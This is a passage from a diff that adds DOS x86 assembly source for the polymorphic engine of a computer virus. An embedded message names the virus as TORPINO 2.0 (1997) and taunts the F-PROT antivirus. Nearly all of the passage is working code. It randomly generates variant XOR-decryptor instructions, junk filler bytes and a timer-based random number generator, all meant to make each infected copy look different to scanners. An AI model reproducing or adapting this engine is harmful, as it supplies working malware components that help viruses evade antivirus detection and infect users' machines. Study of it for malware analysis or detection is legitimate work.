+xx3:    call polxx3
+        jmp n5
+;----------------------------------------------------------------------------
+polxx0: mov si,offset k0+30
+        mov bl,2
+        call riempi
+        mov ax,offset k0+30+2
+        mov xoroff,ax
+        mov word ptr [si],0f789h
+        add si,2  
+        mov byte ptr [si],02eh
+        inc si  
+        mov word ptr [si],0530h  
+        add si,2
+        mov bl,3
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polxx1: mov si,offset k0+30
+        mov bl,3
+        call riempi
+        mov ax,offset k0+30+3
+        mov xoroff,ax
+        mov word ptr [si],0c388h
+        add si,2
+        mov byte ptr [si],2eh
+        inc si  
+        mov word ptr [si],1c30h 
+        add si,2
+        mov bl,2
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polxx2: mov si,offset k0+30
+        mov bl,2
+        call riempi
+        mov ax,offset k0+30+2
+        mov xoroff,ax
+        mov word ptr [si],0c288h
+        add si,2
+        mov word ptr [si],0f789h
+        add si,2
+        mov word ptr [si],0302eh
+        add si,2
+        mov byte ptr [si],15h  
+        inc si
+        mov bl,1
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polxx3: mov si,offset k0+30
+        mov bl,1
+        call riempi
+        mov ax,offset k0+30+1
+        mov xoroff,ax
+        mov word ptr [si],0f289h
+        add si,2
+        mov word ptr [si],0da87h
+        add si,2
+        mov word ptr [si],0c288h
+        add si,2
+        mov word ptr [si],302eh 
+        add si,2
+        mov byte ptr [si],17h
+        inc si
+        ret
+;---------------------------------------------------------------------------
+n5:     call caso
+        shr dx,1
+        cmp dx,0
+        je al0
+        cmp dx,1
+        je al1
+        cmp dx,2
+        je al2
+        jmp al3
+al0:    call polal0
+        jmp n6
+al1:    call polal1
+        jmp n6
+al2:    call polal2
+        jmp n6
+al3:    call polal3
+        jmp n6
+;----------------------------------------------------------------------------
+polal0: mov si,offset k0+40
+        mov bl,2
+        call riempi
+        mov word ptr [si],0ffb7h
+        add si,2  
+        mov word ptr [si],0fb86h
+        add si,2
+        mov word ptr [si],0d828h 
+        add si,2
+        mov bl,2
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polal1: mov si,offset k0+40
+        mov bl,3
+        call riempi
+        mov word ptr [si],0ffb2h
+        add si,2
+        mov word ptr [si],0ead0h
+        add si,2
+        mov word ptr [si],0014h 
+        add si,2
+        mov bl,1
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polal2: mov si,offset k0+40
+        mov bl,2
+        call riempi
+        mov word ptr [si],0c8feh
+        add si,2
+        mov word ptr [si],014f9h
+        add si,2
+        mov byte ptr [si],01h
+        inc si  
+        mov bl,3
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polal3: mov si,offset k0+40
+        mov bl,1
+        call riempi
+        mov word ptr [si],045b2h
+        add si,2
+        mov word ptr [si],044b6h
+        add si,2
+        mov word ptr [si],0f228h
+        add si,2
+        mov word ptr [si],0d000h
+        add si,2
+        mov bl,1
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+n6:     call caso
+        shr dx,1
+        cmp dx,0
+        je sx0
+        cmp dx,1
+        je sx1
+        cmp dx,2
+        je sx2
+        jmp sx3
+sx0:    call polsx0
+        jmp n7
+sx1:    call polsx1
+        jmp n7
+sx2:    call polsx2
+        jmp n7
+sx3:    call polsx3
+        jmp n7
+;----------------------------------------------------------------------------
+polsx0: mov si,offset k0+50
+        mov bl,1
+        call riempi
+        mov word ptr [si],018bah
+        add si,2  
+        mov word ptr [si],8309h 
+        add si,2
+        mov word ptr [si],0ffc2h 
+        add si,2
+        mov word ptr [si],0d683h 
+        add si,2
+        mov byte ptr [si],0 
+        inc si  
+        ret
+;----------------------------------------------------------------------------
+polsx1: mov si,offset k0+50
+        mov bl,1
+        call riempi
+        mov word ptr [si],0d231h
+        add si,2
+        mov word ptr [si],0ea83h
+        add si,2
+        mov word ptr [si],8302h
+        add si,2
+        mov word ptr [si],00d6h 
+        add si,2
+        mov bl,1
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+polsx2: mov si,offset k0+50
+        mov word ptr [si],0ffbbh
+        add si,2
+        mov word ptr [si],0baffh
+        add si,2
+        mov word ptr [si],0fffeh
+        add si,2
+        mov word ptr [si],0d329h
+        add si,2
+        mov word ptr [si],0de01h
+        add si,2
+        ret
+;----------------------------------------------------------------------------
+polsx3: mov si,offset k0+50
+        mov bl,2
+        call riempi
+        mov word ptr [si],0ffbah
+        add si,2
+        mov word ptr [si],029ffh
+        add si,2
+        mov byte ptr [si],0d6h
+        inc si   
+        mov bl,3
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+n7:     call caso
+        shr dx,1
+        cmp dx,0
+        je lo0
+        cmp dx,1
+        je lo1
+        cmp dx,2
+        je lo2
+        jmp lo3
+lo0:    call pollo0
+        jmp n8
+lo1:    call pollo1
+        jmp n8
+lo2:    call pollo2
+        jmp n8
+lo3:    call pollo3
+        jmp n8
+n8:     ret
+;----------------------------------------------------------------------------
+pollo0: mov si,offset k0+60
+        mov bl,4
+        call riempi
+        mov byte ptr [si],49h
+        inc si
+        mov ax,offset k0+60+5
+        sub ax,xoroff
+        mov bx,0ffh
+        sub bx,ax
+        dec bx
+        mov byte ptr [si],75h   
+        inc si  
+        mov [si],bl     
+        inc si
+        mov bl,3
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+pollo1: mov si,offset k0+60
+        mov bl,2
+        call riempi
+        mov word ptr [si],0cb89h
+        add si,2
+        mov word ptr [si],07549h
+        add si,2
+        mov ax,offset k0+60+5
+        sub ax,xoroff
+        mov bx,0ffh
+        sub bx,ax
+        dec bx
+        mov [si],bl    
+        inc si  
+        mov bl,3
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+pollo2: mov si,offset k0+60
+        mov bl,2
+        call riempi
+        mov word ptr [si],8349h
+        add si,2
+        mov word ptr [si],00f9h
+        add si,2
+        mov byte ptr [si],075h   
+        inc si  
+        mov ax,offset k0+60+6
+        sub ax,xoroff
+        mov bx,0ffh
+        sub bx,ax
+        dec bx
+        mov [si],bl
+        inc si
+        mov bl,2
+        call riempi
+        ret
+;----------------------------------------------------------------------------
+pollo3: mov si,offset k0+60
+        mov bl,2
+        call riempi
+        mov word ptr [si],0c183h
+        add si,2
+        mov word ptr [si],075ffh
+        add si,2
+        mov ax,offset k0+60+5
+        sub ax,xoroff
+        mov bx,0ffh
+        sub bx,ax
+        dec bx
+        mov [si],bl  
+        inc si   
+        mov bl,3
+        call riempi
+        ret
+;-----------------------Byte code delle itruzioni di riempimento-------------
+unbyte:  db 0f9h,0f5h,0fbh,0fch,47h,4ah,42h,90h
+duebyte: db 0a8h,01h,89h,0c3h,12h,34h,0d0h
+         db 0e2h,01h,0dfh,89h,0c2h,0ebh,00h,38h,0cch
+otto     dw 8
+riempi: mov di,offset unbyte
+        call caso
+        add di,dx
+        mov al,[di]
+        mov [si],al
+        inc si
+        dec bl
+padi:   jz exriempi
+        cmp bl,1
+        je riempi
+        call chiedi
+        jc riempi
+        mov di,offset duebyte
+        call caso
+        shl dx,1
+        add di,dx
+        mov al,[di]
+        mov [si],al
+        inc si
+        inc di
+        mov al,[di]
+        mov [si],al
+        inc si
+        sub bl,2
+        jmp padi
+exriempi: ret
+;-----------------------Generatore di numeri casuali------------------------
+caso:   push bx
+        mov al,0
+        out 43h,al
+        in al,40h
+        mov ah,al
+        in al,40h
+        push ax
+        mov bx,ds
+        mov ds,ax
+        pop ax
+        add ax,ds:[bx]
+        mov ds,bx
+        add ax,240h
+        xor dx,dx
+        div otto
+        pop bx
+        ret
+;-----------------------'Decisogeno'-----------------------------------------
+chiedi: mov al,0
+        out 43h,al
+        in al,40h
+        mov ah,al
+        in al,40h
+        mov al,ah
+        shr al,1
+        ret
+;----------------------------------------------------------------------------
+random: mov al,0
+        out 43h,al
+        in al,40h
+        mov ah,al
+        in al,40h
+        ret
+;-----------------------Messaggio interno------------------------------------
+        db 'We Thank Very Much The F-PROT Antivirus For The '
+        db 'Contribution To The Spread Of This Virus... '
+        db 'Have A Good Time ! '
+        db 'By The Virus TORPINO (C) Ver. 2.0, '
+        db 'Copyright(C) 1997 By DR.SCSI And Mr. IDE. '
+        db 'Total Rows Code: 3474, ' 
+        db 'Coded In ITALY, '
+        db 'Around MATERA,In July-December 1997. '
+        db 'Direct Support: '
+        db 'Our Heads; '
+        db 'Dave Mustaine; '
+        db 'Billy (A Programmer Dog!). '
+        db 'Indirect Support: '
+        db 'The Great Dark Avenger; '
+        db 'N.R.L.G Team; '
+        db 'Peter Norton (Smack !); '
+        db 'Our WorkStation: Two 486; '
+        db 'The Obscure Author Of Tentacle. '
+                                                 
+fine:
+end inizio
